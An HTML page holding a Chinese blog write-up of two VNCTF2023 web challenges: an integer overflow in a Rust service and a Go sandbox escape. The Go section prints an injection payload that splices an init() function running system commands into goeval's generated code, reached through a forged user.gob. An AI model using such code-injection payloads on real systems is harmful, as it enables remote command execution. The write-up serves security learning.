@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='电子木鱼 一道简单的rust但是好像和rust没有太大的关系。先来看看源码： use actix_files::Files; use actix_web::{ error, get, post, web::{self, Json}, App, Error, HttpResponse, HttpServer, }; use once_cell::sync::Lazy; use serde::{Deserialize, Serialize}; use std::sync::{Arc, Mutex}; use tera::{Context, Tera}; static GONGDE: Lazy&amp;lt;ThreadLocker&amp;lt;i32&amp;gt;&amp;gt; = Lazy::new(|| ThreadLocker::from(0)); #[derive(Debug, Clone,'><title>VNCTF2023-Web</title>
+
+<link rel='canonical' href='https://koali-www.github.io/2023/vnctf2023web/'>
+
+<link rel="stylesheet" href="/scss/style.min.9386c8bee911c8cc9f9c4df385b91100cfdaf1122a331583f740062d4eae78a6.css"><meta property='og:title' content='VNCTF2023-Web'>
+<meta property='og:description' content='电子木鱼 一道简单的rust但是好像和rust没有太大的关系。先来看看源码： use actix_files::Files; use actix_web::{ error, get, post, web::{self, Json}, App, Error, HttpResponse, HttpServer, }; use once_cell::sync::Lazy; use serde::{Deserialize, Serialize}; use std::sync::{Arc, Mutex}; use tera::{Context, Tera}; static GONGDE: Lazy&amp;lt;ThreadLocker&amp;lt;i32&amp;gt;&amp;gt; = Lazy::new(|| ThreadLocker::from(0)); #[derive(Debug, Clone,'>
+<meta property='og:url' content='https://koali-www.github.io/2023/vnctf2023web/'>
+<meta property='og:site_name' content='k0a1i'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='Go' /><meta property='article:tag' content='Rust' /><meta property='article:tag' content='rce' /><meta property='article:tag' content='溢出' /><meta property='article:published_time' content='2023-03-01T13:34:39&#43;08:00'/><meta property='article:modified_time' content='2023-03-01T13:35:36&#43;08:00'/>
+<meta name="twitter:title" content="VNCTF2023-Web">
+<meta name="twitter:description" content="电子木鱼 一道简单的rust但是好像和rust没有太大的关系。先来看看源码： use actix_files::Files; use actix_web::{ error, get, post, web::{self, Json}, App, Error, HttpResponse, HttpServer, }; use once_cell::sync::Lazy; use serde::{Deserialize, Serialize}; use std::sync::{Arc, Mutex}; use tera::{Context, Tera}; static GONGDE: Lazy&amp;lt;ThreadLocker&amp;lt;i32&amp;gt;&amp;gt; = Lazy::new(|| ThreadLocker::from(0)); #[derive(Debug, Clone,"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://koali-www.github.io/" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>返回</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu84895f112c8e6c0fe80c5eecd5e543f0_258028_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">k0a1i</a></h1>
+        <h2 class="site-description">流水不争先,争的是滔滔不绝</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页/Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于/About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接/Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档/Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索/Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #80aba9; color: #fff;">
+                CTF | 端茶送水web手
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2023/vnctf2023web/">VNCTF2023-Web</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 01, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    2312字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="电子木鱼">电子木鱼</h2>
+<p>一道简单的rust但是好像和rust没有太大的关系。先来看看源码：</p>
+<pre><code class="language-rust">use actix_files::Files;
+use actix_web::{
+    error, get, post,
+    web::{self, Json},
+    App, Error, HttpResponse, HttpServer,
+};
+use once_cell::sync::Lazy;
+use serde::{Deserialize, Serialize};
+use std::sync::{Arc, Mutex};
+use tera::{Context, Tera};
+
+static GONGDE: Lazy&lt;ThreadLocker&lt;i32&gt;&gt; = Lazy::new(|| ThreadLocker::from(0));
+
+#[derive(Debug, Clone, Default)]
+struct ThreadLocker&lt;T&gt; {
+    value: Arc&lt;Mutex&lt;T&gt;&gt;,
+}
+
+impl&lt;T: Clone&gt; ThreadLocker&lt;T&gt; {
+    fn get(&amp;self) -&gt; T {
+        let mutex = self.value.lock().unwrap();
+        mutex.clone()
+    }
+    fn set(&amp;self, val: T) {
+        let mut mutex = self.value.lock().unwrap();
+        *mutex = val;
+    }
+    fn from(val: T) -&gt; ThreadLocker&lt;T&gt; {
+        ThreadLocker::&lt;T&gt; {
+            value: Arc::new(Mutex::new(val)),
+        }
+    }
+}
+
+#[derive(Serialize)]
+struct APIResult {
+    success: bool,
+    message: &amp;'static str,
+}
+
+#[derive(Deserialize)]
+struct Info {
+    name: String,
+    quantity: i32,
+}
+
+#[derive(Debug, Copy, Clone, Serialize)]
+struct Payload {
+    name: &amp;'static str,
+    cost: i32,
+}
+
+const PAYLOADS: &amp;[Payload] = &amp;[
+    Payload {
+        name: &quot;Cost&quot;,
+        cost: 10,
+    },
+    Payload {
+        name: &quot;Loan&quot;,
+        cost: -1_000,
+    },
+    Payload {
+        name: &quot;CCCCCost&quot;,
+        cost: 500,
+    },
+    Payload {
+        name: &quot;Donate&quot;,
+        cost: 1,
+    },
+    Payload {
+        name: &quot;Sleep&quot;,
+        cost: 0,
+    },
+];
+
+#[get(&quot;/&quot;)]
+async fn index(tera: web::Data&lt;Tera&gt;) -&gt; Result&lt;HttpResponse, Error&gt; {
+    let mut context = Context::new();
+
+    context.insert(&quot;gongde&quot;, &amp;GONGDE.get());
+
+    if GONGDE.get() &gt; 1_000_000_000 {
+        context.insert(
+            &quot;flag&quot;,
+            &amp;std::env::var(&quot;FLAG&quot;).unwrap_or_else(|_| &quot;flag{test_flag}&quot;.to_string()),
+        );
+    }
+
+    match tera.render(&quot;index.html&quot;, &amp;context) {
+        Ok(body) =&gt; Ok(HttpResponse::Ok().body(body)),
+        Err(err) =&gt; Err(error::ErrorInternalServerError(err)),
+    }
+}
+
+#[get(&quot;/reset&quot;)]
+async fn reset() -&gt; Json&lt;APIResult&gt; {
+    GONGDE.set(0);
+    web::Json(APIResult {
+        success: true,
+        message: &quot;重开成功，继续挑战佛祖吧&quot;,
+    })
+}
+
+#[post(&quot;/upgrade&quot;)]
+async fn upgrade(body: web::Form&lt;Info&gt;) -&gt; Json&lt;APIResult&gt; {
+    if GONGDE.get() &lt; 0 {
+        return web::Json(APIResult {
+            success: false,
+            message: &quot;功德都搞成负数了，佛祖对你很失望&quot;,
+        });
+    }
+
+    if body.quantity &lt;= 0 {
+        return web::Json(APIResult {
+            success: false,
+            message: &quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;,
+        });
+    }
+
+    if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) {
+        let mut cost = payload.cost;
+
+        if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; {
+            cost *= body.quantity;
+        }
+
+        if GONGDE.get() &lt; cost as i32 {
+            return web::Json(APIResult {
+                success: false,
+                message: &quot;功德不足&quot;,
+            });
+        }
+
+        if cost != 0 {
+            GONGDE.set(GONGDE.get() - cost as i32);
+        }
+
+        if payload.name == &quot;Cost&quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &quot;小扣一手功德&quot;,
+            });
+        } else if payload.name == &quot;CCCCCost&quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &quot;功德都快扣没了，怎么睡得着的&quot;,
+            });
+        } else if payload.name == &quot;Loan&quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;,
+            });
+        } else if payload.name == &quot;Donate&quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &quot;好人有好报&quot;,
+            });
+        } else if payload.name == &quot;Sleep&quot; {
+            return web::Json(APIResult {
+                success: true,
+                message: &quot;这是什么？床，睡一下&quot;,
+            });
+        }
+    }
+
+    web::Json(APIResult {
+        success: false,
+        message: &quot;禁止开摆&quot;,
+    })
+}
+
+#[actix_web::main]
+async fn main() -&gt; std::io::Result&lt;()&gt; {
+    let port = std::env::var(&quot;PORT&quot;)
+        .unwrap_or_else(|_| &quot;2333&quot;.to_string())
+        .parse()
+        .expect(&quot;Invalid PORT&quot;);
+
+    println!(&quot;Listening on 0.0.0.0:{}&quot;, port);
+
+    HttpServer::new(move || {
+        let tera = match Tera::new(&quot;src/templates/**/*.html&quot;) {
+            Ok(t) =&gt; t,
+            Err(e) =&gt; {
+                println!(&quot;Error: {}&quot;, e);
+                ::std::process::exit(1);
+            }
+        };
+        App::new()
+            .app_data(web::Data::new(tera))
+            .service(Files::new(&quot;/asset&quot;, &quot;src/templates/asset/&quot;).prefer_utf8(true))
+            .service(index)
+            .service(upgrade)
+            .service(reset)
+    })
+    .bind((&quot;0.0.0.0&quot;, port))?
+    .run()
+    .await
+}
+
+</code></pre>
+<p>审计完之后发现<code>GONGDE</code>能够大于<code>1_000_000_000</code>就给flag。关键代码在这里</p>
+<pre><code class="language-rust">if cost != 0 {
+    GONGDE.set(GONGDE.get() - cost as i32);
+}
+</code></pre>
+<p>如果能够让<code>cost</code>成为一个大负数，就可以控制<code>GONGDE</code>成为一个大正数。结合后面的<code>i32</code>，可以想到整数溢出，所以现在的目的是让<code>cost</code>足够大。</p>
+<p>控制<code>cost</code>的代码：</p>
+<pre><code class="language-rust">if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; {
+    cost *= body.quantity;
+}
+</code></pre>
+<p><code>quantity</code>是我们传入的变量之一。那么当<code>quantity</code>足够大时（比如大于2147283647），cost就会产生溢出。</p>
+<p>因此最终传入<code>name=Cost&amp;quantity=214748365</code>时会使<code>cost</code>溢出到<code>-2147483646</code>，从而使<code>GONGDE</code>成为较大的正数。</p>
+<p><em>这里注意，如果传入的<code>quantity=2147483648</code>，也就是刚好大于i32时，服务器会返回<code>Parse error: number too large to fit in target type.</code>参考下面的解释（大概）</em></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 314; 
+			flex-basis: 753px"
+	>
+	<a href="/2023/vnctf2023web/image-20230228100743212.png" data-size="964x307">
+		<img src="/2023/vnctf2023web/image-20230228100743212.png"
+			width="964"
+			height="307"
+			srcset="/2023/vnctf2023web/image-20230228100743212_hu61d50c3b5d7e5cea037a858293193f06_48974_480x0_resize_box_3.png 480w, /2023/vnctf2023web/image-20230228100743212_hu61d50c3b5d7e5cea037a858293193f06_48974_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="image-20230228100743212">
+	</a>
+	
+	<figcaption>image-20230228100743212</figcaption>
+	
+</figure></p>
+<h2 id="babygo">BabyGo</h2>
+<p>简单的Go沙箱逃逸</p>
+<p>看看源码</p>
+<pre><code class="language-go">package main
+
+import (
+	&quot;encoding/gob&quot;
+	&quot;fmt&quot;
+	&quot;github.com/PaulXu-cn/goeval&quot;
+	&quot;github.com/duke-git/lancet/cryptor&quot;
+	&quot;github.com/duke-git/lancet/fileutil&quot;
+	&quot;github.com/duke-git/lancet/random&quot;
+	&quot;github.com/gin-contrib/sessions&quot;
+	&quot;github.com/gin-contrib/sessions/cookie&quot;
+	&quot;github.com/gin-gonic/gin&quot;
+	&quot;net/http&quot;
+	&quot;os&quot;
+	&quot;path/filepath&quot;
+	&quot;strings&quot;
+)
+
+type User struct {
+	Name  string
+	Path  string
+	Power string
+}
+
+func main() {
+	r := gin.Default()
+	store := cookie.NewStore(random.RandBytes(16))
+	r.Use(sessions.Sessions(&quot;session&quot;, store))
+	r.LoadHTMLGlob(&quot;template/*&quot;)
+	
+	r.GET(&quot;/&quot;, func(c *gin.Context) {
+		userDir := &quot;./&quot; + cryptor.Md5String(c.ClientIP()+&quot;VNCTF2023GoGoGo~&quot;) + &quot;/&quot;
+		session := sessions.Default(c)
+		session.Set(&quot;shallow&quot;, userDir)
+		session.Save()
+		fileutil.CreateDir(userDir)
+		gobFile, _ := os.Create(userDir + &quot;user.gob&quot;)
+		user := User{Name: &quot;ctfer&quot;, Path: userDir, Power: &quot;low&quot;}
+		encoder := gob.NewEncoder(gobFile)
+		encoder.Encode(user)
+		if fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+&quot;user.gob&quot;) {
+			c.HTML(200, &quot;index.html&quot;, gin.H{&quot;message&quot;: &quot;Your path: &quot; + userDir})
+			return
+		}
+		c.HTML(500, &quot;index.html&quot;, gin.H{&quot;message&quot;: &quot;failed to make user dir&quot;})
+	})
+
+	r.GET(&quot;/upload&quot;, func(c *gin.Context) {
+		c.HTML(200, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;upload me!&quot;})
+	})
+
+	r.POST(&quot;/upload&quot;, func(c *gin.Context) {
+		session := sessions.Default(c)
+		if session.Get(&quot;shallow&quot;) == nil {
+			c.Redirect(http.StatusFound, &quot;/&quot;)
+		}
+		userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;
+		fileutil.CreateDir(userUploadDir)
+		file, err := c.FormFile(&quot;file&quot;)
+		if err != nil {
+			c.HTML(500, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;no file upload&quot;})
+			return
+		}
+		ext := file.Filename[strings.LastIndex(file.Filename, &quot;.&quot;):]
+		if ext == &quot;.gob&quot; || ext == &quot;.go&quot; {
+			c.HTML(500, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;Hacker!&quot;})
+			return
+		}
+		filename := userUploadDir + file.Filename
+		if fileutil.IsExist(filename) {
+			fileutil.RemoveFile(filename)
+		}
+		err = c.SaveUploadedFile(file, filename)
+		if err != nil {
+			c.HTML(500, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;failed to save file&quot;})
+			return
+		}
+		c.HTML(200, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;file saved to &quot; + filename})
+	})
+
+	r.GET(&quot;/unzip&quot;, func(c *gin.Context) {
+		session := sessions.Default(c)
+		if session.Get(&quot;shallow&quot;) == nil {
+			c.Redirect(http.StatusFound, &quot;/&quot;)
+		}
+		userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot;
+		files, _ := fileutil.ListFileNames(userUploadDir)
+		destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;))
+		for _, file := range files {
+			if fileutil.MiMeType(userUploadDir+file) == &quot;application/zip&quot; {
+				err := fileutil.UnZip(userUploadDir+file, destPath)
+				if err != nil {
+					c.HTML(200, &quot;zip.html&quot;, gin.H{&quot;message&quot;: &quot;failed to unzip file&quot;})
+					return
+				}
+				fileutil.RemoveFile(userUploadDir + file)
+			}
+		}
+		c.HTML(200, &quot;zip.html&quot;, gin.H{&quot;message&quot;: &quot;success unzip&quot;})
+	})
+
+	r.GET(&quot;/backdoor&quot;, func(c *gin.Context) {
+		session := sessions.Default(c)
+		if session.Get(&quot;shallow&quot;) == nil {
+			c.Redirect(http.StatusFound, &quot;/&quot;)
+		}
+		userDir := session.Get(&quot;shallow&quot;).(string)
+		if fileutil.IsExist(userDir + &quot;user.gob&quot;) {
+			file, _ := os.Open(userDir + &quot;user.gob&quot;)
+			decoder := gob.NewDecoder(file)
+			var ctfer User
+			decoder.Decode(&amp;ctfer)
+			if ctfer.Power == &quot;admin&quot; {
+				eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\&quot;Good\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))
+				if err != nil {
+					fmt.Println(err)
+				}
+				c.HTML(200, &quot;backdoor.html&quot;, gin.H{&quot;message&quot;: string(eval)})
+				return
+			} else {
+				c.HTML(200, &quot;backdoor.html&quot;, gin.H{&quot;message&quot;: &quot;low power&quot;})
+				return
+			}
+		} else {
+			c.HTML(500, &quot;backdoor.html&quot;, gin.H{&quot;message&quot;: &quot;no such user gob&quot;})
+			return
+		}
+	})
+
+	r.Run(&quot;:80&quot;)
+}
+</code></pre>
+<p>具体思路是通过上传包含user.gob的zip压缩包，然后访问unzip让其解压到对应目录下面，最后通过访问backdoor，判断user.gob内含的user信息是否是admin，如果是admin就进入eval进行rce。</p>
+<h3 id="简单记录一下goeval的rce">简单记录一下goeval的rce</h3>
+<p>拿到goeval的源码：</p>
+<pre><code class="language-go">package goeval
+
+import (
+	&quot;fmt&quot;
+	&quot;go/format&quot;
+	&quot;math/rand&quot;
+	&quot;os&quot;
+	&quot;os/exec&quot;
+	&quot;strings&quot;
+	&quot;time&quot;
+)
+
+const (
+	letterBytes = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+	letterIdxBits = 6                    // 6 bits to represent a letter index
+	letterIdxMask = 1&lt;&lt;letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
+	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
+)
+
+var (
+	dirSeparator = &quot;/&quot;
+	tempDir      = os.TempDir()
+	src          = rand.NewSource(time.Now().UnixNano())
+)
+
+// 参考： https://colobu.com/2018/09/02/generate-random-string-in-Go/
+func RandString(n int) string {
+	b := make([]byte, n)
+	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
+	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i &gt;= 0; {
+		if remain == 0 {
+			cache, remain = src.Int63(), letterIdxMax
+		}
+		if idx := int(cache &amp; letterIdxMask); idx &lt; len(letterBytes) {
+			b[i] = letterBytes[idx]
+			i--
+		}
+		cache &gt;&gt;= letterIdxBits
+		remain--
+	}
+	return string(b)
+}
+
+func Eval(defineCode string, code string, imports ...string) (re []byte, err error) {
+	var (
+		tmp = `package main
+%s
+%s
+func main() {
+%s
+}
+`
+		importStr string
+		fullCode string
+	 	newTmpDir = tempDir + dirSeparator + RandString(8)
+	)
+
+	if 0 &lt; len(imports) {
+		importStr = &quot;import (&quot;
+		for _, item := range imports {
+			if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd {
+				importStr += fmt.Sprintf(&quot;\n %s \&quot;%s\&quot;&quot;, item[:blankInd], item[blankInd+1:])
+			} else {
+				importStr += fmt.Sprintf(&quot;\n\&quot;%s\&quot;&quot;, item)
+			}
+		}
+		importStr += &quot;\n)&quot;
+	}
+	fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)
+
+	var codeBytes = []byte(fullCode)
+	// 格式化输出的代码
+	if formatCode, err := format.Source(codeBytes); nil == err {
+		// 格式化失败，就还是用 content 吧
+		codeBytes = formatCode
+	}
+
+	// 创建目录
+	if err = os.Mkdir(newTmpDir, os.ModePerm); nil != err {
+		return
+	}
+	defer os.RemoveAll(newTmpDir)
+	// 创建文件
+	tmpFile, err := os.Create(newTmpDir + dirSeparator + &quot;main.go&quot;)
+	if err != nil {
+		return re, err
+	}
+	defer os.Remove(tmpFile.Name())
+	// 代码写入文件
+	tmpFile.Write(codeBytes)
+	tmpFile.Close()
+	// 运行代码
+	cmd := exec.Command(&quot;go&quot;, &quot;run&quot;, tmpFile.Name())
+	res, err := cmd.CombinedOutput()
+	return res, err
+}
+</code></pre>
+<p>关键代码：</p>
+<pre><code class="language-go">var (
+    tmp = `package main
+%s
+%s
+func main() {
+%s
+}
+`
+    importStr string
+    fullCode string
+    newTmpDir = tempDir + dirSeparator + RandString(8)
+)
+
+if 0 &lt; len(imports) {
+    importStr = &quot;import (&quot;
+    for _, item := range imports {
+        // 碰到第一个空格就在它后面加双引号
+        if blankInd := strings.Index(item, &quot; &quot;); -1 &lt; blankInd {
+            importStr += fmt.Sprintf(&quot;\n %s \&quot;%s\&quot;&quot;, item[:blankInd], item[blankInd+1:])
+        } else {
+            importStr += fmt.Sprintf(&quot;\n\&quot;%s\&quot;&quot;, item)
+        }
+    }
+    importStr += &quot;\n)&quot;
+}
+fullCode = fmt.Sprintf(tmp, importStr, defineCode, code)
+</code></pre>
+<p>这里是将传入的参数拼接到tmp字符串中，生成一个完整的go文件。所以可以直接拼接代码进去实现rce。</p>
+<p>构造可以执行系统命令的完整go文件：</p>
+<pre><code class="language-go">package main
+
+import (
+	&quot;os/exec&quot;
+	&quot;fmt&quot;
+)
+func init(){
+    cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)
+    res,err := cmd.CombinedOutput()
+    fmt.Println(string(res))
+    fmt.Println(err)
+}
+</code></pre>
+<p>由于tmp里面已经有main函数，且函数执行的代码是我们不可控的，因此自行拼接一个init函数，让其在main函数之前被执行。同时为了闭合eval给出的引号，对这一段代码进行修改，给出如下exp：</p>
+<pre><code class="language-txt">os/exec\&quot;\n\&quot;fmt\&quot;)\nfunc\tinit(){\ncmd\t:=exec.Command(\&quot;ls\&quot;,\&quot;/\&quot;)\nres,err\t:=\tcmd.CombinedOutput()\nfmt.Println(string(res))\nfmt.Println(err)\n}\nconst(\nMessage=\&quot;fmt
+</code></pre>
+<p>在web传参的时候记得url编码。</p>
+<h2 id="吐槽碎碎念">吐槽&amp;碎碎念</h2>
+<p>rust环境真难装，装完发现用不到。</p>
+<p>还有一道php据说很难就没做23333</p>
+<p>最近太焦虑了，心又浮躁的很，在思考该怎么冷静下来</p>
+<p>以及还是没有找到secret，崩溃.jpg</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">web</a>
+        
+            <a href="/tags/go/">Go</a>
+        
+            <a href="/tags/rust/">Rust</a>
+        
+            <a href="/tags/rce/">rce</a>
+        
+            <a href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 01, 2023 13:35 CST
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/2022/%E8%93%9D%E5%B8%BD%E6%9D%AF2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">蓝帽杯2022</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/2022/dasctfxsuctf-web-writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTFxSUCTF-web-writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
